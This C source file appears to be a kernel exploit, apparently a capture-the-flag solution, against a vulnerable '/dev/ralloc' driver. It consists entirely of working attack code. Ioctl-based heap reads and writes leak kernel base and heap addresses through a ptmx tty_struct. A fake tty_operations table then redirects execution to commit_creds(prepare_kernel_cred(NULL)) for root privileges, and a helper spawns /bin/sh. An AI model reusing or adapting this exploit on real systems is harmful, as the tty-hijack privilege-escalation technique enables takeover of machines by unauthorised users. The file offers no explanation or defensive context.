#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0x10af6a0;

unsigned long cc = 0xc0540;
unsigned long pkc = 0xc07a0;


 
void *(*prepare_kernel_cred)(void *) ;
int (*commit_creds)(void *) ;
void *fake_tty_operations[30];
  
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

int spray_fd[0x100];

struct message {
  unsigned long index;
  long size;
  char *buf;
};


void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
   if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

int main() {
  unsigned long buf[0x400 / sizeof(unsigned long)];
  save_state();
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDWR);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  /* leak kbase & kheap */
  int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  kmalloc(fd, 0, 0x30);
  kmalloc(fd, 1, 0x400);
  get(fd, 1, 0x400, &buf);
  kbase = buf[3] - ptm_unix98_ops;
  kheap = buf[8] - 0x38 + 0x400;
  printf("[*] Leak                :   0x%lx\n", buf[3]);
  printf("[*] Heap                :   0x%lx\n", kheap);
  printf("[*] Base                :   0x%lx\n", kbase);
  printf("[*] Gadget              :   0x%lx\n", kbase + 0xb55c7);
  commit_creds = kbase + cc;
  prepare_kernel_cred = kbase + pkc;
  printf("[*] prepare_kernel_creds:   0x%lx\n", prepare_kernel_cred);
  printf("[*] commit_creds        :   0x%lx\n", commit_creds);
  
  for(int i=0; i< 30; i++)
  {
    fake_tty_operations[i] = 0;
  }

  fake_tty_operations[12] = (size_t)get_root;

  buf[3] = (size_t)fake_tty_operations;

  fill(fd, 1, sizeof(buf), &buf);
  sleep(4);
  ioctl(ptmx,0,0); // -8 for pop r13
  return 0;
}
